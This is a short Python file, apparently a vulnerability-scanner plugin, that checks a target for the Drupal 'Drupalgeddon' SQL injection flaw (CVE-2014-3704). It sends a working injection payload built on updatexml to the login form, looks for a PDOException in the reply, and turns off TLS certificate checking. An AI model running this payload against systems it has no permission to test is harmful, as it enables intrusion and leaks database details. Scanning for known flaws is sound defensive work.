# -*- coding:utf-8 -*-

import ssl
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol + '://' + ip + ':' + str(port)
    print('testing if drupal < 7.32 version drupalgeddon sql injection vul(cve-2014-3704)')
    try:
        path = '/?q=node&destination=node'
        vulpath = url + path
        headers = {
            "Accept-Encoding":"gzip, deflate",
            "Accept":"*/*",
            "Accept-Language":"en",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
            "Content-Length":"120"
        }
        payload = "pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a"
        html = requests.post(vulpath, verify=False, headers=headers, timeout=8, data=payload).text
        if 'user_login' in html and 'error' in html and 'PDOException' in html:
            msg = 'There is a drupal < 7.32 version drupalgeddon sql injection vul(cve-2014-3704) on %s' % url
            print(msg)
            number = 'v120'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg
    msg = 'There is no drupal < 7.32 version drupalgeddon sql injection vul(cve-2014-3704)'
    number = 'v0'
    return False, url, number, msg